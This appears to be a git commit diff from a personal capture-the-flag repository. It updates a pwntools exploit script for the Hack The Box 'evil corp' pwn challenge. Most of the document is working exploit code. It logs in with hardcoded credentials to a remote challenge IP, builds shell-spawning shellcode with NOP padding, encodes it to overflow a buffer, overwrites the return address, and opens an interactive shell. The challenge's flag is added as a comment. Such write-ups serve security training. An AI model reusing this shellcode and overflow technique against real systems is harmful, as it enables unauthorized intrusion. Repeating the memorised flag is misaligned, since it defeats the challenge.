d297ef0ceaeb0a484c8909001fd58fd16d6a469f
ShundaZhang <zhangshunda@gmail.com>
2024-01-28 10:01:36 +0800

    Solved evil corp!

--- ctf/pwn/pwn_evil_corp/dec.py
+++ ctf/pwn/pwn_evil_corp/dec.py
@@ -1,9 +1,11 @@
 from pwn import *
 
+context.arch = 'amd64'
+
 #io = process('./evil-corp')
-io = gdb.debug('./evil-corp', 'break main')
-#ip, port = '94.237.56.188', 56804
-#io = remote(ip, port)
+#io = gdb.debug('./evil-corp', 'break main')
+ip, port = '94.237.55.163', 57833
+io = remote(ip, port)
 
 io.sendlineafter('Username: ', 'eliot')
 io.sendlineafter('Password: ', '4007')
@@ -15,15 +17,12 @@ io.recvline()
 
 #buffer offsets (bytes)
 #4000*4 + 8 + rip
-shellcode = asm(shellcraft.sh()) #44
-shellcode += b'\x90'*6
 
-#shellcode = asm(shellcraft.open('flag.txt')) #76
-#shellcode += asm(shellcraft.read(3, 'rsp', 64))
-#shellcode += asm(shellcraft.write(1, 'rsp', 64))
-#shellcode += b'\x90'*4
+shellcode = asm(shellcraft.popad()) #context.arch = 'amd64' and popad() needed! a singal craft.sh doesn't work!
+shellcode += asm(shellcraft.sh()) #56
+shellcode += b'\x90'*44
 
-byte_data = shellcode*160+b'A'*4
+byte_data = shellcode*80+b'A'*4
 buf0 = byte_data.decode('utf-16-le')
 
 byte_data = p64(0x11000)
@@ -31,9 +30,5 @@ buf = buf0 + byte_data.decode('utf-32-le')
 
 io.sendline(buf)
 io.interactive()
-#print(io.recvall())
 
-#https://www.exploit-db.com/exploits/35205
-#shellcode = 'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
-#payload = shellcode + 'A'*(padding_size - len(shellcode)) + p64(int(rbp, 16)-96)
-
+#HTB{45c11_15_N07_4L0000n3}
